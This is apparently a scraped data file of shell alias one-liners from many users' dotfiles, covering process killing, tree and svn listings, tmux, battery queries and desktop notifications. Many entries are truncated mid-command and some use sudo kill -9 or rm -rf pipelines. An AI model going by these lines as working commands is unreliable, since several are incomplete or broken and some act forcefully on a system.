"upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E ""state|energy\:|time|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT1 | grep -E ""percentage|time to full|time to empty|state"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0|head -20|egrep -io ""discharging""||echo it is charging"
"upower -i /org/freedesktop/UPower/devices/battery_BAT0|grep -E ""state|time\ to\ full|time\ to\ empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""updated|state|time\ to|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|to\ full|percentage|time\ to\ empty"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|to\ full|percentage|time"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0| grep -E ""state|to\ full|empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E --color=never ""state|to\ full|to\ empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\ full|to\ empty|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\ full|percentage|time\ to\ empty"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|to\ full|percentage|time to empty"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|time\ to\ empty|time\ to\ full|percentage"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | grep -E ""state|energy\:|time|percentage"""
"upower -i $(upower -e | grep BAT) | grep -E ""state|time|percentage"" --color=never"
"upower -i $(upower -e | grep BAT) | egrep ""state|time|percentage"""
"upower -i $(upower -e | grep ""BAT"") | grep -E ""state|to\full|percentage"""
"upower -i $(upower -e | grep ""BAT"") | grep -E ""state|to\ full|percentage"""
"upower -i $(upower -e | grep ""BAT"") | grep -E ""state|time\ to|percentage"""
"unalias $(alias | sed ""s|=.*||g"" ) ; unalias ""gcan!"" ""gca!"" ""gc!"""
"type brew > /dev/null 2>&1 && ( brew update && brew upgrade && (brew info cask &>/dev/null && brew cask upgrade || true) && brew cleanup ) || ( echo ""Homebrew is not installed :("" && exit 127 )"
"twmnc -t ""$([ $? = 0 ] && echo terminal || echo error)"" -c ""$(history|tail -n1|sed -e "
"tsc | grep -vE ""node_modules|Map|troubleshoot|only supported in ECMAScript 6"""
"tree -pFCfhD -I ""components|tmp|node_modules"" . | grep ""$1"" | less -RgIKNs"
"tree -alCF -I "".git|node_modules|dist|target|.cache"""
"tree -a -I ""node_modules|.git|.next|dist|__generated__"""
"tree -a --prune -I $(cat .gitignore | egrep -v ""^#.*$|^[[:space:]]*$"" | tr ""\\n"" ""|"")"
"tree -L 2 -I `cat .gitignore | grep ""^[^#]"" | sed ""s/\///g"" | paste -sd ""|"" -`"
"tree -I ""node_modules|bower_components|CMakeFiles|_site|static"""
"tree -I ""bower_components|dist|node_modules|temp|tmp"""
"tree -I "".git|node_modules|__pycache__|venv|vendor"""
"tree -Ca -I "".git|.svn|*.pyc|*.swp|node_modules"""
"tree -C -a --dirsfirst -I ""__pyc*|node_modules|elm-stuff|.git|target"""
"tree -C -I ""node_modules|env|vendor|__pycache__|*.pyc"""
"tree -C --prune -I $(cat .gitignore ~/.gitignore | egrep -v ""^#.*$|^[[:space:]]*$"" | tr ""\\n"" ""|"")"
"tree -AC -I ""*.pyc|_darcs|cabal-dev|dist|state"""
"tree --prune -I $(cat .gitignore | egrep -v ""^#.*$|^[[:space:]]*$"" | tr ""\\n"" ""|"")"
"tree --prune -I $(cat $DOTFILES_PATH/.gitignore | egrep -v ""^#.*$|^[[:space:]]*$"" | tr ""\\n"" ""|"")"
"tree --noreport -I ""node_modules|dist|static|vendor|_site"""
"tree --dirsfirst -ACFIal ""bower_*|jspm_*|node_*|.git*|.svn"""
"tr -s "" "" | cut -d "" "" -f 9- | sed -e ""s/\s*->.*//"" | grep -vE ""^(\.|\.\.)$"""
"tr ""\t"" ""|"" | sed -e ""s/^/|/g"" -e ""s/$/|/g"""
"tr "","" ""|"" | sed -e ""s/^/|/g"" -e ""s/$/|/g"""
"tput bel; notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Done: $(history|tail -n1|sed -e "
"top | colout "" R "" yellow | colout "" 0[0.:]*"" red | colout "" root |/.*"" green"
"top -orsize -FR -l1 | grep % | grep -v Load | grep -v COMMAND | cut -c 7-19,64-69"
"toast -Text ""$([ $? = 0 ] && echo terminal || echo error)\n$(history|tail -n1|sed -e "
"tmux ls | grep : | cut -d. -f1 | awk '{print substr(\$1, 0, length(\$1)-1)}' | xargs kill"
"tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill"
"tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs -n1 tmux kill-session -t"
"tmux ls | grep : | cut -d. -f1 | awk ""{print substr($1, 0, length($1)-1)}"" | xargs kill"
"tmux kill-session -t $(tmux list-sessions | sed -E ""s/:.*$//"" | grep -v \""^$(tmux display-message -p ""#S"")\$\"" | fzf --reverse | xargs echo)"
"tmux attach -t $(tmux list-sessions | sed -E ""s/:.*$//"" | grep -v \""^$(tmux display-message -p ""#S"")\$\"" | fzf --reverse | xargs echo)"
"tmux attach -t $(echo ${PWD##*/} | sed ""s/[^a-zA-Z0-9]//g"") || tmux new -s $(echo ${PWD##*/} | sed ""s/[^a-zA-Z0-9]//g"") tmux source-file .tmux.conf"
"tmate attach -t $(echo ${PWD##*/} | sed ""s/[^a-zA-Z0-9]//g"") || tmate new -s $(echo ${PWD##*/} | sed ""s/[^a-zA-Z0-9]//g"") tmate source-file .tmux.conf"
"tm ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill"
"test -n ""${DOCKERFILE}"" || export DOCKERFILE=Dockerfile ; test -n ""${TAG}"" || export TAG=""$( basename ""$( pwd )"" )"""
"test -f ${HOME}/SecretDisk.dmg || hdiutil create -encryption AES-256 -volname SecDisk -nospotlight -type UDIF -fs ""Case-sensitive APFS"" -stdinpass -size 128M -layout NONE SecretDisk.dmg; test -d ${HOME}/SecretDisk || mkdir ${HOME}/SecretDisk; hdiutil attach ${HOME}/SecretDisk.dmg -mountpoint ${HOME}/SecretDisk; cd ${HOME}/SecretDisk"
"terminal-notifier -title ""$([ $? = 0 ] && echo terminal || echo error)"" -message ""$(history|tail -n1|sed -e "
"terminal-notifier -title ""$([ $? = 0 ] && echo Success || echo Error)"" -message ""$(history | tail -n1 | sed -e "
"terminal-notifier -message ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"telegram-send ""$([ $? = 0 ] && echo """" || echo ""error: "") $(history|tail -n1|sed -e "
"task long `task tags|sed '1,2d;/^$/,$d'|cut -f1 -d ' '|sed 's/\(.*\)/-\1/'|tr "
"target_dir=`pwd`; while [ ! -z $target_dir ]; do cd $target_dir; target_dir=$(echo "".."" | cat - =(find -L . -maxdepth 1 -type d -name ""[^.]*"" -printf ""%f\n"" | sort) =(find -L . -maxdepth 1 -type d -name "".*"" -printf ""%f\n"" | sort) | peco); done"
"tail -n 2 ~/.zsh_history | head -n 1 | sed ""s/^[^;]*;//g"" | tr -d ""\n"" | xsel -b"
"tail -f < $(ls -als | sort -k 8,10 | grep error.log | tail -n1 | awk '{print $NF}')"
"tail -f ./test.log | grep ""\(TEST.*\|RUN\|OK\|FAILED\)"""
"tail -f -n5 $(find /var/log -name \*log) | grep -iE ""(^err|error|fatal|avc)"""
"t ""\b(INFO|WARN|SEVERE|ERROR|FATAL)\b"""
"systemctl list-timers coopdoor* | grep coopdoor | cut -f3 -d"" "" | cut -f1-2 -d: | sort"
"syslog -k Time ge -24h | egrep -e ""sshd|ftpd|afp|vnc"""
"swift package generate-xcodeproj --output=`pwd | rev | cut -d ""/"" -f 1 | rev | tr -d "" ""`.xcodeproj"
"svn status|grep -v ^? |grep -v ""^\s*\<X\>""|grep -v ""Performing status on external item at""|grep -v ^$"
"svn status|grep -v ""^\?""|grep -v ""^X""|grep -v ""^Performing""|grep -v ""^$"""
"svn status | grep -v ^X | grep -v ""^ X"" | grep -v ""^$"" | grep -v ""^P"""
"svn status | grep ""^\?"" | sed -e ""s/? *//"" | sed -e ""s/ /\\\\ /g"" | xargs svn add"
"svn status | grep ""^\!"" | sed -e ""s/! *//"" | sed -e ""s/ /\\\\ /g"" | xargs svn rm"
"svn stat | grep ""^\?"" | sed ""s/\? *tmp.*//"" | sed ""s/\? *log.*//"" | grep ."
"svn st | grep -v ""^X"" | grep -v ""^Perf"" | grep -v ""^\?"" | uniq"
"svn st | grep ! | tr -s "" "" | cut -d "" "" -f 2- | xargs svn rm"
"svn ls ^/tags/ | egrep -v ""[a-Z+_\-]"" | sort -V | tail -n 1 | sed ""s/\///g"""
"svn info | grep ""^URL:"" | grep ""http://\([^/]*/\)*"" -o | tr -d ""\n"" | xargs -0 svn ls"
"svn info | command grep -oP ""^(URL|Revision):\s*\K.*"" | tr ""\n"" ""@"" | sed -E ""s/@+$/\n/"""
"sudo vzlist -a -o ctid,hostname,status,ostemplate,numproc,diskspace,diskspace.s,diskinodes,diskinodes.s | perl -p -e 's/\.internal\.strobe\.net//' | tr -s ' ' | tr ' ' '\t' | expand -t 1,2,7,17,26,44,50,60,70,78"
"sudo salt '*' cmd.run 'nvidia-smi --query-compute-apps=pid --format=csv,noheader | xargs -I {} ps -p {} -o user=' | sort | uniq -c |\
"sudo radeontop -l 1 -d - | sed ""1d"" | head -n 1 | awk ""{print \$3}"" | sed ""s/,//g"""
"sudo pmset -g log | sed -E ""/Assert|UU/d"" | tail -n 50 | pbcopy"
"sudo pacman -Syu && kill -s RTMIN+2 $( ps -ef | grep i3blocksTop | grep -v grep | tr -s "" "" | cut -d "" "" -f2 )"
"sudo pacman -Sgg | grep blackarch | cut -d"" "" -f2 | sort -u | less"
"sudo ngrep -d eth1 -W byline | grep -Pio ""(swfurl\.{2}.*?\.{2})|(\.{2}play.*?\w.*?\.{3})|(tcUrl.*?rtmp://.*?\.{2})|(pageUrl\.{3}.*?\.{2})"""
"sudo netstat -nutlp | grep ':' | awk '{print \$1,\$4,\$NF}' | awk -F: '{print \$1,\$(NF-1),\$NF}' | awk -v OFS=\"
"sudo lsof -Pi | grep LISTEN | sed -E 's/ +/,/g' | cut -d ',' -f 1,2,3,9 | column -s',' -t"
"sudo lsof -Pi | grep LISTEN | awk '{ print \$1,\$3,\$9 }' | sort | uniq"
"sudo iwlist wlan0 scanning | /bin/grep ""Cell\|Quality\|Encryption\|ESSID"""
"sudo iw dev wlp3s0 scan | grep ""SSID\|freq\|DS\|signal"""
"sudo find . | grep -E ""(__pycache__|\.pyc|\.pyo$)"" | xargs rm -rf"
"sudo find . -xdev -type f | cut -d ""/"" -f 2 | sort | uniq -c | sort -n"
"sudo du -s `pwd`/* 2>/dev/null| sort -nr | cut -f 2- | while read a; do sudo du -sh ""$a"" 2>/dev/null; done|head"
"sudo dscacheutil -flushcache;sudo killall -HUP mDNSResponder;scutil --dns|grep -A20 ""scoped queries""|egrep ""resolver|domain|nameserver"""
"sudo apt update && sudo apt upgrade -y && sudo apt autoremove -y && pyenv update && nvim -N -u ~/.config/nvim/init.vim -c ""try | call dein#update() | finally | qall! | endtry"" -V1 -es && zplug update && ~/.tmux/plugins/tpm/bin/update_plugins all"
"sudo \pstree | fgrep -B1 ""<defunct>"" | head -n1 | sed -e ""s/^.* \([0-9]*\) .*$/\1/g"" | xargs -L1 -P1 ps co pid,command,jid -p"
"sudo -s launchctl unload -w /System/Library/LaunchDaemons/ftp.plist && sudo kill $(ps -ax | grep ftpd | grep -v grep | grep -o ""\d\+"" | sed -n 1p) > /dev/null 2>&1"
"strings /dev/urandom | cat /dev/urandom| tr -dc ""a-zA-Z0-9-_!@#$%&*()_+{}:<>?="" | fold -w 15| head -n 4"
"strings /dev/urandom | cat /dev/random| tr -dc ""a-zA-Z0-9-_!@#$%&*()_+{}:<>?="" | fold -w 15| head -n 1"
"squeue -u $USER -o ""%T %C"" | grep ""RUNNING"" | cut -d "" "" -f2 | paste -sd+ | bc"
"squeue -u $USER -o ""%C"" | tail -n +2 | tr -s ""[:space:]"" | paste -sd+ | bc"
"squeue -o ""%.7i %.8Q %.10u %.10a %.8q %.9P %.12j %.6C %.16S %.10L %.r"" -t PD --sort=S,-p | grep -v ""N/A"" | hluser; squeue -o ""%.7i %.8Q %.10u %.10a %.8q %.9P %.12j %.6C %.16S %.10L %.r"" -t PD --sort=S,-p | grep --color=never ""N/A"" | hluser"
"spring stop 2>/dev/null; ps ax | egrep ""\bspring\b"" | grep -v grep | cut -d "" "" -f 1 | xargs kill -9"
"setxkbmap us dvorak -option compose:menu,ctrl:nocaps,terminate:ctrl_alt_bksp,lv3:ralt_alt 2> /dev/null || setxkbmap dvorak us 2> /dev/null || setxkbmap dvorak'"
"setxkbmap gb dvorak -option compose:menu,ctrl:swapcaps,terminate:ctrl_alt_bksp,lv3:ralt_alt 2> /dev/null || setxkbmap dvorak gb 2> /dev/null || setxkbmap dvorak'"
"set s=`pwd`; pushd /; find $s -name ""*.[chs]"" -ls | sed -e ""s|.* /cygdrive/c/|c:/|"" > $s/cscope.files; popd; cscope -I /cygdrive/c/Programs/gcc/arm-none-eabi/include -b"
"set +x; while : ; do if [ -e $workdir/fin ]; then rm -f $workdir/fin; break; fi; sleep 1; done; for i in $(awk ""{print \$3}"" $workdir/qsub.log); do qacct -j $i|egrep ""^(failed|exit_status)""|tail -n 2|awk ""\$2!=0{a++} END{if(a>0){print $i\"" was failed\""}}""; done > qsub.log2; rm -f $workdir/qsub.log; if [ ""`cat qsub.log2`"" != """" ]; then cat qsub.log2; echo 1 > $workdir/fin_status; exit 1; fi; set -x"
"sensors | \grep -E ""CPU FAN|CPU Tem|MB Tem|Core"""
"select br in $(git br -r|grep -v ""(""|grep -v HEAD|cut -c3-|sed ""s/^origin.//""); do git co $br; break; done"
"sed -r ""s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K|A|B|C]//g"""
"sed -r ""/^:/, \$d"" | sed ""/^\s*$/d"" | sed ""/^(ESV2011)$/d"" | awk ""/^[a-zA-Z0-9 ]+:[0-9]+:/ {if (NR!=1){printf \""\n%s\"",\$0;}else printf \""%s\"",\$0;next; }{printf \"" %s\"",\$0;}END{print \""\"";}"" | sed -r ""s/\s+/ /g"""
"sed -n 7p pom.xml | sed -e ""s/<[^>]*>//g"" | sed -e ""s/-S.*//g"" | trim | pbcopy"
"search -E ""((//|#|--)\s+(TODO|REMOVEME|FIXME))"""
"screen -r `screen -ls | grep Detached | awk ""{ print $1 }"" | sort -r | head -1`"
"screen -ls | grep Detached | cut -d. -f1 | awk ""{print $1}"" | xargs kill"
"scp pkg/resources/prod-global-config.json pd-hdp-indx-wf-1:~/prod-global-config-`git branch | grep \* | cut -d "" "" -f2`.json; scp pkg/resources/prod-global-config.json pd-hdp-info-wf-1:~/prod-global-config-`git branch | grep \* | cut -d "" "" -f2`.json"
"scontrol show hostnames $SLURM_NODELIST | tr '\n' ',' | rev | cut -c 2- | rev"
"ruby -e ""puts Dir[Dir.pwd + \""/**/*\""].max_by{ |path| File.file?(path) && File.size?(path) || 0 }"""
"rspec --no-color --format=progress spec | grep failures | sed 's/.*examples\, //' | sed 's/0/no/' | say &"
"rm $(find . -name ""*~"") || rm $(find . -name ""*.swo"") || rm $(find . -name ""*.swp"")"
"rg ^a /usr/share/dict/words | awk '{ print length, $0 }' | gsort -n -s | cut -d' ' -f2- | tail"
"res=$? && notify-send --urgency=low -i ""$([ $res = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"rename 'unless (/0+[0-9]{4}.(jpeg|jpg|png)/) {s/^([0-9]{1,3}\.(jpeg|jpg|png))$/000$1/g;s/0*([0-9]{4}\..*)/$1/}' *"
"read -n 1 -p ""OK to make bunch of dirs in ../? [yN]"" -r; echo ; [[ $REPLY =~ ^[Yy]$ ]] && git ls-remote --heads | cut -f 3 -d ""/"" | grep -v master | grep -v ""From "" | xargs -I{} git worktree add ../{} {}"
"pyenv local $(pyenv versions | \grep -oE ""3\.8\.[0-9]+|3.8-dev"" | sort -r | head -n 1)"
"pwd;find . |sort|sed '1d;s,[^/]*/,| ,g;s/..//;s/[^ ]*$/|-- &/'"
"pwd | sed -e ""s|$HOME|~|g"""
"psef | /bin/grep -v -E -- ""USER|pts/"" | sort -rk4 | head -n 10"
"ps xukuser,comm | egrep -v ""grep|ps xuk|vim"" | egrep `erating_processes`"
"ps xukuser,comm | egrep -v ""grep|ps xuk|vim"" | egrep `dev_processes`"
"ps u|head -1 && ps auxww|ack -v ""USER""|sort +3|tail -5"
"ps u|head -1 && ps auxww|ack -v ""USER""|sort +3|tail -10"
"ps u|head -1 && ps auxww|ack -v ""USER""|sort +2|tail -5"
"ps u|head -1 && ps auxww|ack -v ""USER""|sort +2|tail -10"
"ps ax|egrep '*\.exe'|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -7 -p $1 ; echo --- ; \
"ps ax|egrep '*\.exe'|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -5 -p $1 ; echo --- ; \
"ps ax|egrep '*\.exe'|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -3 -p $1 ; echo --- ; \
"ps ax|egrep '*\.exe'|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -2 -p $1 ; echo --- ; \
"ps axxx | grep appserver_cm[1-9] | awk ""/\/bin\/sh/ {split(\$7,fld,/_/); print fld[1]}"" | sort | uniq"
"ps axww -o pid,%cpu,%mem,time,command | tail -n +2 | selecta | sed 's/^ *//' | cut -f1 -d' '"
"ps axww -F | head -1; ps axww -F | grep -P ""^523|USER""; ps axww -F | head -1"
"ps axfo user,pid,vsz,rss,%cpu,stat,start_time,args | egrep -v ""(\[kthreadd\]|\\_ \[.+\])"" | cut -c1-$COLUMNS | sed -e ""s/ *$//"""
"ps ax | grep xMetering | grep -v grep | xargs | cut -f 1 -d "" """
"ps aux|grep gvfs|cut -d "" "" -f 2,2|tr ""\n"" "" ""| xargs sudo kill -9"
"ps aux|grep -v grep|grep fcitx &>/dev/null || fcitx&>/dev/null& \
"ps aux |grep python3 | grep -vE ""(grep|/usr/bin/python3)"" | grep python3"
"ps aux |grep python2 | grep -vE ""(grep|/usr/bin/python2)"" | grep python2"
"ps aux | grep ssh-agent | grep -v grep | awk ""{print \$2}"" | xargs sudo kill"
"ps aux | grep spring | grep -v ""grep"" | awk ""{print $2}"" | xargs kill"
"ps aux | grep sm_ansible_server.py | grep -v grep | tr -s "" "" | cut -d "" "" -f 2"
"ps aux | grep set-alarm | grep -v grep | tr -s "" "" | cut -d "" "" -f 13-"
"ps aux | grep hbase | tail +2 | awk ""{print $2}"" | xargs kill"
"ps aux | grep CloudForgeBuild | grep java | sed ""s/\s\s*/ /g"" | cut -d "" "" -f 2"
"ps aux | grep ""[/]tmp/go"" | tr -s "" "" | cut -d"" "" -f2 | xargs kill"
"ps aux | awk '{print \$2, \$4, \$11}' | sort -k2rn | head -n 10 | column -t"
"ps aux | ack ""ruby|passenger"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""rspec"" | ack -v ""spork"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""clojure|lein"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""[^a-zA-Z0-9_](cat|less)$"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux | ack ""(bin.?ruby)|(puma)"" | awk ""{print \$2}"" | xargs kill -9"
"ps aux --noheader | awk '$3 > 1.0 || $8 !~ /S/ {print $3,$8,$11}' | sort -nr"
"ps -u $USER o pid,ppid,c,pmem,stime,tty,time,stat,cmd --sort -rss --cols $COLUMNS | grep -vP ""(sshd: |sftp-server|-bash|ps -u )"""
"ps -opid,cmd | tail -n +2 | grep python | awk '{print \$1 }' | xargs kill -2"
"ps -o pid,ppid,user,pcpu,pmem,vsz,rss,time,stime,zone,comm,args |head -1;ps -o pid,ppid,user,pcpu,pmem,vsz,rss,time,stime,zone,comm,args -u oracle -y |grep -v ""COMMAND$"" |sort -nrk5 |head -20"
"ps -fu $USER | sort | egrep -v ""ps -fu|sort|grep"""
"ps -fe | grep tomcat | grep -v grep | awk ""{print \$2}"" | xargs kill -9"
"ps -fe | grep selenium | grep -v grep | awk ""{print \$2}"" | xargs kill -9"
"ps -eo user:25,pid,lstart,cmd --sort=user | grep Xvnc | grep -v grep | grep -v thinlinc | awk '{print \$1 \"
"ps -eo pid,ppid,start,%cpu,command|sort -k3,2|grep -E '([^ ]*[p]ostgres[ :]|[m]agma_server |[p]sql )'"
"ps -ejFL --sort=cmd | egrep -v ""grep |ps -ejF|vim"" | egrep `erating_processes`"
"ps -ejFL --sort=cmd | egrep -v ""grep |ps -ejF|vim"" | egrep `dev_processes`"
"ps -ejFH --sort=cmd | egrep -v ""grep |ps -ejF|vim"" | egrep `erating_processes`"
"ps -ejFH --sort=cmd | egrep -v ""grep |ps -ejF|vim"" | egrep `dev_processes`"
"ps -efa \!* | grep $USER | grep -vE ""tcsh|$WINTERM|grep rh031132"""
"ps -ef | sed 1d | fzf -m | awk ""{print \$2}"" | xargs kill -9"
"ps -ef | grep firefox | grep -v grep | awk ""{print $2}"" | xargs kill -9"
"ps -ef | grep dd | grep sudo | awk ""{print \$2}"" | xargs sudo kill -USR1"
"ps -ef | grep -E ""language-server|languageserver|javascript-typescript-stdio"" | grep -v grep"
"ps -ef | grep 'postgres:.*con[[:digit:]]\{1,\}' | grep -v grep| awk '{print \$2}'| xargs kill -9"
"ps -ef | grep ""zsh"" | grep -v grep | awk ""{print $2}"" | xargs -r kill -9"
"ps -e | grep ""python.*crawler"" | grep -v grep | sed ""s/^ *\([0-9]*\).*/\1/"" | xargs kill -9"
"ps -c -r -ax -o command,pid,pcpu,time | sed 's/\(PID *\)%/\1 %/' | head -n 11 && echo && ps -c -m -ax -o command,pid,pmem,rss=RSIZE | sed 's/\(.\{23\}\)/\1 /' | head -n 9"
"ps -a|grep ""/usr/local/bin/ruby script/server""|grep -v ""grep /usr""|cut -d "" "" -f1|xargs -n 1 kill -HUP $1"
"ps -axo etime,state,pid,command | egrep --color=always '(python.*youtube-dl)|(/n1auto-youtube-dl.sh)' | grep -v egrep ; ls -1 ~/Dropbox/var/youtube-dl | grep -c .txt"
"ps -ax | fzf --ansi | sed ""s/^ *//"" | cut -d "" "" -f1 | xargs -o kill"
"ps -ax | awk ""/pulse\/pulseUi/"" | cut -d? -f1 | sed ""s/^[[:blank:]]*//;s/[[:blank:]]*$//"" | xargs kill -9"
"ps -arcwwwxo ""pid command %cpu %mem"" | perl -pe ""s/%(?=(?:cpu|mem))/ /ig"" | grep -v grep | head -13"
"ps -a -eo pid,command | grep ""node.*webpack-dev-server"" | grep -v grep | awk ""{print \$1}"" | xargs kill -9"
"ps -U tomcat -eo pid,command | grep tomcat | grep -v ps | grep -v grep | grep -o -E "
"ps -A | grep -v grep | grep ""ssh -D 8080 -f -C -q -N"" | cut -f1 -d"" "" | while read pid; do sudo kill -9 $pid ; done"
"ps -A | egrep ""(nginx)|(memcached)|(node)|(prime_cache)"""
"ps -A -o user,pid,ppid,start,time,args | egrep -v ""ps -A -o|egrep -v|ggrep -E -i --color"" | ggrep -E -i --color"
"printf ' RSS\t %%MEM %%CPU COMMAND\n';\ps -e -o rssize,pmem,pcpu,args | sort -nr | cut -c-156 | head -500 | awk '{printf \"
"printf %s ""$(history | tail -2 | head -1 | sed s/^[[:space:]]*[[:digit:]]*[[:space:]]*//)"" | clip"
"printf ""%s-by: Joey Pabalinas <joeypabalinas@gmail.com>\n"" Acked Co-developed Reported Reviewed Signed-off Suggested Tested | tee >(head -n1 | xclip -i -r -sel prim) | tee >(head -n1 | xclip -i -r -sel clip)"
"printf ""$(pwd)"" | sed ""s|$HOME|~|g"""
"powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""C:\Users\scheedalla\alert.ps1"" -msgtype ""$([ $? = 0 ] && echo Info || echo Error)"" -title ""WSL Terminal"" -msg ""$(history|tail -n1|sed -e "
"pod=$(kubectl get pods | cut -f1 -d"" "" | fzf); kubectl exec -ti $pod bash || kubectl exec -ti $pod sh"
"pod=$(k get pods | cut -f1 -d"" "" | fzf); k exec -ti $pod bash || k exec -ti $pod sh"
"pmset -g log | grep -e "" Sleep "" -e "" Wake "" | grep -v ""Maintenance"" | grep -v ""Sleep Service Back to Sleep"" | tail -15"
"pmset -g batt | grep Internal | cut -f2 | cut -d' ' -f1,2,3,4| sed s/\;\ 0\:00.*//g"
"pm2 logs ""/custom*|pay*|pool*|tbw*|forger*/"""
"pip list --outdated | cut -d"" "" -f1 | egrep -v ""Package|---"" | xargs sudo -H pip install -U "
"phpfiles | xargs egrep ""mysql_|mysqli_|pg_|oci_"""
"phpcs `git s | grep ""^A\|\ M"" | sed ""s/A //"" | sed ""s/ M //""` "
"phpcs -a $(svn stat | grep ""\(M \|A \)"" | grep -v ""external item"" | cut -c8-)"
"pgrep ps3joy.py > /dev/null || pgrep ps3joy_node > /dev/null || sudo bash -c ""source /home/demo/.bashrc; /opt/ros/groovy/lib/ps3joy/ps3joy_node.py --inactivity-timeout=300"""
"pf | tr""="" "" "" | grep ""^[^-]"" | column -t | column"
"pf | tr ""="" "" "" | grep ""^[^-]"" | column -t | column"
"pbsnode | grep -oe ""has [0-9]"" | grep -o ""[0-9]"" | sort -urn | head -1"
"pbpaste | perl -pi -e ""s/^\""|\""$//g"" $1 | jsonpp $1 | pbcopy"
"parallel -i $SHELL -c ""echo {} {} |& stdbuf -oL sed \""s|^|{}-\$$:\\t|\"""" -- $("
"paplay /usr/share/sounds/freedesktop/stereo/complete.oga && notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"pacmd load-module module-remap-sink sink_name=mono master=`pacmd list-sinks | grep name: | grep analog |awk -F'<' '{ print $2 }' |awk -F'>' '{ print $1 }'` channels=2 channel_map=mono,mono"
"pacman -Qi | grep ""Name\|Description"" | cut -d \: -f 2 | awk "" {print;} NR % 2 == 0 { print ""\n""; }"""
"pacman -Qdtq | paste -sd"" "" | tee >(perl -pe ""chomp if eof"" | xsel -ib) /dev/stderr | sudo pacman -Rs -"
"osc repos | fzf | tr --squeeze-repeats "" "" | cut --delimiter="" "" --fields=1 | xargs --no-run-if-empty osc build --target="
"open https://papertrailapp.com/systems/`curl -s -H ""X-Papertrail-Token: $PAPERTRAIL_API_TOKEN"" https://papertrailapp.com/api/v1/groups.json | jq -r "".[0].systems | map(.name) | .[]"" | fzf`/events"
"open -a ""Simulator"" || open -a ""iOS Simulator"" || open -a ""iPhone Simulator"""
"nzsystem showregistry | egrep -ie ""(\.gk|\.gra|\.sn|\.sched)"" "
"nvidia-settings -q ""[gpu:0]/GPUCoreTemp"" | grep Attribute | awk ""{print \$4}"" | tr -d . | echo $(cat)°C"
"npm start | h -ni "".js http error starting|watching|connecting|running"" localhost port connected open "
"npm -g ls | grep -v ""npm@"" | awk ""/@/ {print $2}"" | awk -F@ ""{print $1}"" | xargs npm -g rm"
"notifyme ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send -urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send -u normal -t 60000 -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send -u normal -i ""$([ $? = 0 ] && echo ubuntu-tweak || echo terminal || echo error )"" ""Wallpaper saved"" ""LoveWallPaper.jpg copied successfully!"""
"notify-send -u low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Terminal"" ""$(history|tail -n1|sed -e "
"notify-send -u low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send -t 5000 --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""Finished"" ""$(history|tail -n1|sed -e "
"notify-send -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(cat $HOME/.zsh_history|tail -n1|cut -d"
"notify-send -a Alert --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=normal -i ""$([ $? = 0 ] && echo terminal || echo error)""""$(history|tail -n1|sed -e "
"notify-send --urgency=normal -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=normal ""$([ $? = 0 ] && echo Finished || echo Failed)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -t 30000 -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -t 3000 -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -t 2000 -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -t 1000 -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ~/usr/share/images/$([ $? = 0 ] && echo blue || echo red).gif -- ""$(history|tail -n1|sed -e "
"notify-send --urgency=low -i \""\$([ \$? = 0 ] && echo terminal || echo error)\"" \""\$(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""\$([ \$? = 0 ] && echo terminal || echo error)"" ""\$(history|tail -n1|sed -e "
